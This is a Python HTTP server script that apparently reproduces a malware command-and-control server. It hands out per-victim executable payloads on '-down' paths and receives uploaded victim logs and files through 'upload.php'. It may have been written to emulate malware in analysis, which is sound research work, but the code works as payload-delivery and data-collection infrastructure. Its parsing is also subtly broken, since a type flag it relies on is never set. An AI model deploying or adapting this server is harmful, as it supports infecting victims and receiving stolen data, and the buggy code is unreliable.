#!/usr/bin/env python
# -*- coding: utf-8 -*-

import http.server
import socketserver
import os.path
from base64 import b64decode, b64encode
from urllib.parse import urlparse
from urllib.parse import parse_qs


class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        req_path = self.path
        print(self.command + ": " + req_path)
        content_length = self.headers.get('Content-Length')

        filename = ''

        if type(content_length) == str:
            if int(content_length) > 0:
                raise Exception('CONTENT ON GET!')

        if req_path.endswith("/down"):
            # response written to weewyesqsf4.exe
            # Generic Upload to Request
            filename = 'generic_file.exe'
            print('Generic Upload Request')
        elif req_path.endswith("-down"):
            # Specific Upload to Request
            # response written to wirbiry2jsq3454.exe
            victim_id = req_path.split('-down')[0]
            print("victim_id:", victim_id)
            filename = victim_id + '_file.exe'
            print('Specific Upload Request')
        else:
            raise Exception()  # catchall else for debugging

        if os.path.exists(filename):
            response_data = open(filename, 'rb').read()
        else:
            response_data = b'\x00'

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Content-Length", len(response_data))
        self.end_headers()
        self.wfile.write(response_data)
        return

    def do_POST(self):
        req_path = self.path
        print(self.command + ": " + req_path)
        content_length = self.headers.get('Content-Length')

        req_body = str(self.rfile.read(int(content_length)), 'utf-8')

        if req_path.endswith('upload.php'):
            type = '[null]'  # parse either 'file' or 'log': default to '[null]'
            type_flag = 0  # flag used if type tag exists
            subject = req_body.split('&')[0][8:].split('-')[0]
            if len(req_body.split('&')[0][8:].split('-')) > 3:
                type = req_body.split('&')[0][8:].split('-')[1]
                file_i = 1
            time = req_body.split('&')[0][8:].split('-')[1+type_flag]
            date = req_body.split('&')[0][8:].split('-')[2+type_flag]
            data = req_body.split('&')[1][5:]

            print("Subject: %s\n"
                  "Type: %s\n"
                  "Time/Date: %s %s\n"
                  "Data:\n%s" % (subject, type, time, date, data))
        else:
            raise Exception()  # catchall else for debugging

        response_data = b'this is NOT needed!!!!'
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Content-Length", len(response_data))
        self.end_headers()
        self.wfile.write(response_data)
        return


def main():
    httpd = socketserver.TCPServer(("0.0.0.0", 80), RequestHandler)
    httpd.serve_forever()


if __name__ == '__main__':
    main()
